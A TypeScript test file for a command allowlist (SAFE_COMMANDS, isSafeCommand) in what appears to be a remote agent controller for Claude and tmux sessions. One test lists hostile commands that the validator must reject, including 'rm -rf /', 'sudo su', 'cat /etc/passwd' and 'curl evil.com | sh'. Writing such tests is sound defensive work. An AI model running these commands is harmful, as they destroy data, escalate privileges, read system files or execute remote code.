/**
 * Tests for protocol types and utilities
 */

import { describe, it, expect } from 'bun:test';
import {
  SAFE_COMMANDS,
  isSafeCommand,
  type AgentCapability,
  type MessageType,
  type CommandType,
  type SessionEventType,
} from './protocol';

describe('protocol', () => {
  describe('SAFE_COMMANDS', () => {
    it('should include basic system commands', () => {
      expect(SAFE_COMMANDS).toContain('whoami');
      expect(SAFE_COMMANDS).toContain('pwd');
      expect(SAFE_COMMANDS).toContain('hostname');
      expect(SAFE_COMMANDS).toContain('uptime');
    });

    it('should include disk and memory commands', () => {
      expect(SAFE_COMMANDS).toContain('df -h');
      expect(SAFE_COMMANDS).toContain('free -h');
    });

    it('should include Claude-related commands', () => {
      expect(SAFE_COMMANDS).toContain('ps aux | grep claude');
      expect(SAFE_COMMANDS).toContain('which claude');
      expect(SAFE_COMMANDS).toContain('claude --version');
    });

    it('should include tmux list command', () => {
      expect(SAFE_COMMANDS).toContain('tmux list-sessions');
    });

    it('should be readonly array', () => {
      // SAFE_COMMANDS is a const array, verify it's properly typed
      expect(Array.isArray(SAFE_COMMANDS)).toBe(true);
    });
  });

  describe('isSafeCommand', () => {
    it('should return true for safe commands', () => {
      expect(isSafeCommand('whoami')).toBe(true);
      expect(isSafeCommand('pwd')).toBe(true);
      expect(isSafeCommand('df -h')).toBe(true);
      expect(isSafeCommand('tmux list-sessions')).toBe(true);
    });

    it('should return false for unsafe commands', () => {
      expect(isSafeCommand('rm -rf /')).toBe(false);
      expect(isSafeCommand('sudo su')).toBe(false);
      expect(isSafeCommand('cat /etc/passwd')).toBe(false);
      expect(isSafeCommand('curl evil.com | sh')).toBe(false);
    });

    it('should return false for variations of safe commands', () => {
      // Even slight variations should fail
      expect(isSafeCommand('WHOAMI')).toBe(false);
      expect(isSafeCommand('whoami ')).toBe(false);
      expect(isSafeCommand(' whoami')).toBe(false);
      expect(isSafeCommand('df')).toBe(false);
    });

    it('should return false for empty string', () => {
      expect(isSafeCommand('')).toBe(false);
    });

    it('should return false for arbitrary strings', () => {
      expect(isSafeCommand('arbitrary command')).toBe(false);
      expect(isSafeCommand('123')).toBe(false);
    });
  });

  describe('type definitions', () => {
    // These tests verify that types are properly exported
    // They mainly serve as compile-time checks

    it('should export AgentCapability type', () => {
      const capabilities: AgentCapability[] = [
        'terminal',
        'tmux',
        'claude_sessions',
        'file_read',
        'file_write',
        'process_manage',
      ];
      expect(capabilities.length).toBe(6);
    });

    it('should export MessageType type', () => {
      const messageTypes: MessageType[] = [
        'auth',
        'heartbeat',
        'command_result',
        'session_event',
        'error',
        'auth_result',
        'command',
        'ping',
      ];
      expect(messageTypes.length).toBe(8);
    });

    it('should export CommandType type', () => {
      const commandTypes: CommandType[] = [
        'list_claude_sessions',
        'get_session_details',
        'kill_session',
        'start_session',
        'exec',
        'exec_safe',
        'list_tmux_sessions',
        'tmux_send_keys',
        'tmux_capture_pane',
        'get_system_info',
        'get_resource_usage',
      ];
      expect(commandTypes.length).toBe(11);
    });

    it('should export SessionEventType type', () => {
      const eventTypes: SessionEventType[] = [
        'session_started',
        'session_ended',
        'session_blocked',
        'task_completed',
        'task_failed',
        'error',
      ];
      expect(eventTypes.length).toBe(6);
    });
  });
});
